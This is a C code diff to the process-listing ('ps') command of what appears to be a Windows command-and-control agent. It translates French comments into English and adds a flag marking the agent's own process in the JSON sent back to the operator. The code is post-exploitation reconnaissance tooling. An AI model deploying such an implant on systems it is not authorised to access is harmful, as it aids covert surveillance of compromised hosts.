@@ -9,8 +9,8 @@
 
 #ifdef INCLUDE_CMD_PS
 
-/* Récupère le nom d'utilisateur propriétaire d'un processus.
- * Retourne 1 si succès, 0 sinon. */
+/* Get the username that owns a process.
+ * Returns 1 on success, 0 otherwise. */
 static int get_process_user(HANDLE hProc, char *out, DWORD out_size) {
   HANDLE hToken = NULL;
   if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken))
@@ -40,7 +40,7 @@ static int get_process_user(HANDLE hProc, char *out, DWORD out_size) {
 void command_ps(char *task_id, char *params) {
   (void)params;
 
-  /* Hostname utilisé comme champ "host" dans chaque entrée de processus */
+  /* Hostname used as "host" field in each process entry */
   char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
   DWORD hlen = sizeof(hostname);
   GetComputerNameA(hostname, &hlen);
@@ -65,6 +65,8 @@ void command_ps(char *task_id, char *params) {
   int first = 1;
   int proc_count = 0;
 
+  DWORD self_pid = GetCurrentProcessId();
+
   PROCESSENTRY32 pe;
   pe.dwSize = sizeof(pe);
 
@@ -83,12 +85,12 @@ void command_ps(char *task_id, char *params) {
       if (hProc) {
         get_process_user(hProc, username, sizeof(username));
 
-        /* Architecture : si WOW64 → process 32-bit sur OS 64-bit */
+        /* Architecture: if WOW64 -> 32-bit process on 64-bit OS */
         BOOL is_wow64 = FALSE;
         if (IsWow64Process(hProc, &is_wow64) && is_wow64)
           strcpy(arch, "x86");
 
-        /* Chemin complet de l'exécutable */
+        /* Full path to the executable */
         DWORD path_len = sizeof(bin_path);
         QueryFullProcessImageNameA(hProc, 0, bin_path, &path_len);
 
@@ -101,9 +103,9 @@ void command_ps(char *task_id, char *params) {
       char *esc_path = json_escape(bin_path);
       char *esc_host = json_escape(hostname);
 
-      /* Taille estimée de l'entrée */
+      /* Estimated entry size */
       size_t entry_max = strlen(esc_name) + strlen(esc_user) +
-                         strlen(esc_path) + strlen(esc_host) + 320;
+                         strlen(esc_path) + strlen(esc_host) + 340;
       char *entry = (char *)malloc(entry_max);
       int entry_len = 0;
 
@@ -116,15 +118,17 @@ void command_ps(char *task_id, char *params) {
             "\"name\":\"%s\","
             "\"user\":\"%s\","
             "\"architecture\":\"%s\","
-            "\"bin_path\":\"%s\""
+            "\"bin_path\":\"%s\","
+            "\"is_agent\":%s"
             "}",
             first ? "" : ",",
             esc_host,
             pe.th32ProcessID,
             pe.th32ParentProcessID,
-            esc_name, esc_user, arch, esc_path);
+            esc_name, esc_user, arch, esc_path,
+            pe.th32ProcessID == self_pid ? "true" : "false");
 
-        /* Agrandir le buffer si nécessaire */
+        /* Grow the buffer if needed */
         if (pos + (size_t)entry_len + 4 >= buf_size) {
           buf_size *= 2;
           char *tmp = (char *)realloc(procs, buf_size);
@@ -151,9 +155,9 @@ void command_ps(char *task_id, char *params) {
   procs[pos++] = ']';
   procs[pos]   = '\0';
 
-  /* user_output contient le tableau JSON échappé pour que le browser_script
-   * puisse le parser via JSON.parse(responses[0]) et afficher la table.
-   * On n'envoie pas aussi "processes" pour ne pas doubler la taille du payload. */
+  /* user_output holds the JSON-escaped array so the browser_script
+   * can parse it via JSON.parse(responses[0]) and render the table.
+   * We don't also send "processes" to avoid doubling payload size. */
   char *esc_procs = json_escape(procs);
 
   size_t msg_size = (esc_procs ? strlen(esc_procs) : 0) + strlen(task_id) + 256;
